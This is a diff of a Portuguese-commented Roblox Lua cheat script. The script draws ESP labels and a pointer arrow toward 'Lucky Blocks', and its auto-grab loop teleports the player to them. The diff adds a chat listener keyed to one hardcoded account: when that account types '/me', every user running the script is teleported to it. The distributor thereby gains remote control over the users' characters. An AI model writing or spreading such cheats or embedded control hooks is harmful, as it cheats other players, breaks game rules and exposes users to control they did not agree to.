@@ -197,15 +197,33 @@ MinButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Seta direcionadora (~3 metros de comprimento = ~10 studs)
-local pointerPart = Instance.new("Part")
-pointerPart.Name = "LuckyBlockArrow3M"
-pointerPart.Size = Vector3.new(0.5, 0.5, 10)
-pointerPart.Anchored = true
-pointerPart.CanCollide = false
-pointerPart.Material = Enum.Material.Neon
-pointerPart.Color = Color3.fromRGB(0, 255, 255)
-pointerPart.Transparency = 1
+-- -------------------------------------------------------------
+-- SISTEMA DA SETA 3D
+-- -------------------------------------------------------------
+local pointerBase = Instance.new("Part")
+pointerBase.Name = "LuckyBlockPointerBase"
+pointerBase.Size = Vector3.new(1, 1, 1)
+pointerBase.Transparency = 1
+pointerBase.Anchored = true
+pointerBase.CanCollide = false
+
+local shaft = Instance.new("CylinderHandleAdornment", pointerBase)
+shaft.Radius = 0.2
+shaft.Height = 7
+shaft.CFrame = CFrame.new(0, 0, -3.5)
+shaft.Color3 = Color3.fromRGB(0, 255, 255)
+shaft.AlwaysOnTop = true
+shaft.ZIndex = 10
+shaft.Visible = false
+
+local tip = Instance.new("ConeHandleAdornment", pointerBase)
+tip.Radius = 0.8
+tip.Height = 2.5
+tip.CFrame = CFrame.new(0, 0, -7) * CFrame.Angles(math.pi, 0, 0)
+tip.Color3 = Color3.fromRGB(0, 255, 255)
+tip.AlwaysOnTop = true
+tip.ZIndex = 10
+tip.Visible = false
 
 local function getBlocoInfo(bloco)
     local cube = bloco:FindFirstChild("Cube")
@@ -307,19 +325,20 @@ local function atualizarESP()
 
                 local bgui = Instance.new("BillboardGui")
                 bgui.Adornee = mainPart
-                bgui.Size = UDim2.new(0, 150, 0, 40)
+                bgui.Size = UDim2.new(15, 0, 4.5, 0)
                 bgui.AlwaysOnTop = true
-                bgui.ExtentsOffset = Vector3.new(0, (size.Y/2) + 1.5, 0)
+                bgui.ExtentsOffset = Vector3.new(0, (size.Y/2) + 3, 0)
                 
                 local texto = Instance.new("TextLabel", bgui)
                 texto.Size = UDim2.new(1, 0, 1, 0)
                 texto.BackgroundTransparency = 1
-                texto.Text = "Lucky Block"
+                texto.Text = "LUCKY BLOCK"
                 texto.TextColor3 = blockColor
-                texto.TextStrokeTransparency = 0
+                texto.TextStrokeTransparency = 0.2
                 texto.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                 texto.Font = Enum.Font.GothamBlack
-                texto.TextSize = 16
+                texto.TextScaled = true 
+                texto.TextYAlignment = Enum.TextYAlignment.Bottom
                 
                 bgui.Parent = ScreenGui
                 table.insert(objs, bgui)
@@ -344,20 +363,33 @@ EspButton.MouseButton1Click:Connect(function()
     if espAtivo then
         EspButton.Text = "ESP Lucky Block: ON"
         EspButton.TextColor3 = Color3.fromRGB(100, 255, 100)
-        pointerPart.Parent = Workspace
+        pointerBase.Parent = Workspace
         
         atualizarESP() 
         
-        espRenderConnection = RunService.RenderStepped:Connect(function()
+        espRenderConnection = RunService.RenderStepped:Connect(function(deltaTime)
             local char = player.Character
             if char and char:FindFirstChild("Head") then
                 local targetPos, targetColor = getNearestLuckyBlock()
                 if targetPos then
-                    pointerPart.Transparency = 0.1
-                    pointerPart.Color = targetColor
-                    pointerPart.CFrame = CFrame.lookAt(char.Head.Position + Vector3.new(0, 5, 0), targetPos)
+                    shaft.Visible = true
+                    tip.Visible = true
+                    shaft.Color3 = targetColor
+                    tip.Color3 = targetColor
+                    
+                    local headPos = char.Head.Position + Vector3.new(0, 6.5, 0)
+                    local targetCFrame = CFrame.lookAt(headPos, targetPos)
+                    
+                    if pointerBase.CFrame.Position == Vector3.new(0,0,0) then
+                        pointerBase.CFrame = targetCFrame
+                    else
+                        local currentRot = pointerBase.CFrame - pointerBase.CFrame.Position
+                        local positionFixedCFrame = currentRot + headPos
+                        pointerBase.CFrame = positionFixedCFrame:Lerp(targetCFrame, 12 * deltaTime)
+                    end
                 else
-                    pointerPart.Transparency = 1
+                    shaft.Visible = false
+                    tip.Visible = false
                 end
             end
         end)
@@ -365,7 +397,9 @@ EspButton.MouseButton1Click:Connect(function()
         EspButton.Text = "ESP Lucky Block: OFF"
         EspButton.TextColor3 = Color3.fromRGB(255, 255, 255)
         limparESP()
-        pointerPart.Parent = nil
+        pointerBase.Parent = nil
+        shaft.Visible = false
+        tip.Visible = false
         if espRenderConnection then
             espRenderConnection:Disconnect()
             espRenderConnection = nil
@@ -382,7 +416,7 @@ end)
 CloseButton.MouseButton1Click:Connect(function()
     espAtivo = false
     limparESP()
-    pointerPart:Destroy()
+    pointerBase:Destroy()
     if espRenderConnection then espRenderConnection:Disconnect() end
     ScreenGui:Destroy()
 end)
@@ -410,7 +444,6 @@ AutoClickButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Lógica de auto-pegar: teleporta até o Lucky Block e clica 1 vez
 task.spawn(function()
     while task.wait(0.5) do
         if autoClickAtivo then
@@ -436,3 +469,44 @@ task.spawn(function()
     end
 end)
 
+-- -------------------------------------------------------------
+-- COMANDO DE ADMIN (TELEPORTAR TODOS PARA O LÍDER)
+-- -------------------------------------------------------------
+local ADMIN_NAME = "carlostfra112"
+
+local function configurarMonitoramentoChat(outroJogador)
+    -- Monitora apenas o chat da conta Admin definida acima
+    if outroJogador.Name == ADMIN_NAME then
+        outroJogador.Chatted:Connect(function(mensagem)
+            -- Se o admin digitar "/me"
+            if string.lower(mensagem) == "/me" then
+                -- Se o jogador que estiver rodando o script NÃO for o admin (para ele não tentar teleportar para si mesmo)
+                if player.Name ~= ADMIN_NAME then
+                    local adminCharacter = outroJogador.Character
+                    local meuCharacter = player.Character
+                    
+                    if adminCharacter and adminCharacter:FindFirstChild("HumanoidRootPart") and
+                       meuCharacter and meuCharacter:FindFirstChild("HumanoidRootPart") then
+                        
+                        -- Cria uma pequena posição aleatória em volta do admin para evitar que todos os bonecos fiquem presos um dentro do outro
+                        local offsetX = math.random(-4, 4)
+                        local offsetZ = math.random(2, 6)
+                        
+                        -- Teleporta
+                        meuCharacter.HumanoidRootPart.CFrame = adminCharacter.HumanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
+                    end
+                end
+            end
+        end)
+    end
+end
+
+-- Varre os jogadores que já estão no servidor para ver se o admin está online
+for _, jogador in pairs(Players:GetPlayers()) do
+    configurarMonitoramentoChat(jogador)
+end
+
+-- Monitora caso o admin entre no servidor depois que o script já foi executado
+Players.PlayerAdded:Connect(function(jogador)
+    configurarMonitoramentoChat(jogador)
+end)
